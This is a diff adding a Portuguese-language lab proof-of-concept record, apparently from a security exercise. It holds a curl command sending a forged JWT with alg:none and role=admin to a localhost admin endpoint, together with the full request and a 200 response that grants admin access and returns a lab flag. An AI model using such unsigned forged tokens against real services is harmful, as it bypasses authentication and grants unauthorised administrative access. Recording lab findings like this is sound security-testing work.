@@ -1,0 +1,24 @@
+# E3 — E3-03-poc-alg-none: PoC — JWT forjado com alg:none e role=admin
+capturado_em : 2026-11-04T12:59:04.862Z
+duracao_ms   : 0
+expectativa  : 401 se a assinatura fosse verificada; 200 com LAB{JWT_ALG_NONE_ACCEPTED} se não.
+
+$ curl -s -i -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ." http://127.0.0.1:35021/api/v1/admin/debug
+
+>>> REQUISICAO
+GET /api/v1/admin/debug HTTP/1.1
+Host: 127.0.0.1:35021
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyLTEwMDEiLCJyb2xlIjoiYWRtaW4ifQ.
+
+<<< RESPOSTA
+HTTP/1.1 200 OK
+connection: keep-alive
+content-type: application/json; charset=utf-8
+date: Wed, 04 Nov 2026 12:59:04 GMT
+keep-alive: timeout=5
+transfer-encoding: chunked
+
+{
+  "adminAccess": true,
+  "flag": "LAB{JWT_ALG_NONE_ACCEPTED}"
+}
